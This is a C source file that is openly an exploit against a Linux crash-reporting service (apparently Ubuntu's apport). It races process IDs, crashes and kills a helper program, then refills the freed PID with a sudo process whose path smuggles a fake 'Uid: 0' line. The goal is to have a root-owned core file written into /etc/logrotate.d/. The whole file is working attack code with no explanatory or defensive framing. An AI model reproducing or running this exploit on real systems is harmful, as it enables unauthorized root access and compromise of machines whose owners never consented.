#include <unistd.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define PID_THRESHOLD (80)

int read_max_pid_file()
{
	FILE *fd = 0;
	char buf[256];

	fd = fopen("/proc/sys/kernel/pid_max", "r");
	fread(buf, sizeof(buf), 1, fd);
	fclose(fd);
	return atoi(buf);
}

void write_to_fifo_file(char * path)
{
	FILE *fd = 0;
	char buf[] = "A";

	fd = fopen(path, "w");
	fwrite(buf, sizeof(buf), 1, fd);
	fclose(fd);
	return;
}


int main(int argc, char *argv[])
{
	int iteration = 0;
	pid_t crash_pid = -1, temp_pid = -1, spray_pid = -1;
	int current_pid = 0, max_pid = 0;
	int total_pid = 0;

	char *crash_argv[] = {"crash", NULL};
	char *sudo_argv[] = {"sudo", "-S", "sud", NULL};

	char current_dir[1024] = {0};
	char exec_buf[2048] = {0};
	char crash_buf[2048] = {0};

	struct stat sb = {0} ;

	int null_fd = -1;

	signal(SIGCHLD, SIG_IGN);
	getcwd(current_dir, sizeof(current_dir));
	snprintf(exec_buf, sizeof(exec_buf), "%s/%s", current_dir, "a\rUid: 0\rGid: 0");
	snprintf(crash_buf, sizeof(crash_buf), "%s/%s", current_dir, "crash");

	chdir("/etc/logrotate.d/");



	// Creating the crash program
	if (0 == stat(crash_buf, &sb) && sb.st_mode & S_IXUSR)
	{
		crash_pid = fork();
		if (0 == crash_pid)
		{
			execve(crash_buf, crash_argv, NULL);
			exit(0);
		}
		else if(-1 == crash_pid)
		{
			printf("[-] Could not fork program\n");
			return -1;
		}
	}
	else
	{
		printf("[-] Please check crash file executable.");
		return -1;
	}
	

	max_pid = read_max_pid_file();
	printf("[*] crash pid: %d\n", crash_pid);
	printf("[*] max pid: %d\n", max_pid);

	printf("[*] Creating ~%d PIDs\n", max_pid);
    printf("[*] Forking new processes\n");
	sleep(3);

	// Iterating through max_pid to almost reach the crash program pid
	while (iteration < max_pid - 1)
	{
		// Print progress of forks
		if( 0 == (iteration % (int)(max_pid / 5000)))
		{
			printf("\rIteration: %d/%d", iteration + 1, max_pid);
			fflush(stdout);
		}
		temp_pid = -1;
		temp_pid = fork();
		if (0 == temp_pid)
		{
			exit(0);
		}
		else if (temp_pid > 0)
		{
			iteration++;
			// We should stop before the crash pid to avoid other processes created meanwhile to interfere the exploit process
			if ( temp_pid < crash_pid && crash_pid - temp_pid < PID_THRESHOLD)
			{
				printf("\rIteration: %d/%d\n", iteration + 1, max_pid);
				fflush(stdout);
				printf("[+] less then %d pid from the target: last fork=%d , target: %d\n", PID_THRESHOLD, temp_pid, crash_pid);
				break;
			}
		}
		else if (-1 == temp_pid)
		{
			printf("[-] Could not fork temp programs\n");
		}
	}

	printf("[*] Crashing the crash program\n");
	kill(crash_pid, SIGSEGV); // From Now on the seconds apport will launch and we have 30 seconds to exploit it
	sleep(5);
	printf("[*] Killing the crash program\n");
	kill(crash_pid, SIGKILL);
	sleep(3);

	// Now crash pid is free and we need to occupy it
	for(int i=0; i < PID_THRESHOLD ; i++)
	{
		spray_pid = fork();
		if (0 == spray_pid)
		{
			if (crash_pid == getpid())
			{
				null_fd = open("/dev/null", O_WRONLY);
				dup2(null_fd, 1);
				dup2(null_fd, 2);
				close(null_fd);

				printf("[+] Creating suid process\n");
				execve(exec_buf, sudo_argv, NULL);
			}
			exit(0);
		}
	}

	sleep(3);
	printf("[*] Writing to fifo file\n");
	write_to_fifo_file(argv[1]);

	// Now the first apport released and the second apport resumed
	printf("[+] Wrote core file to cwd!\n");
	sleep(10); // Waiting for the second apport to finish execution

	return 0;
}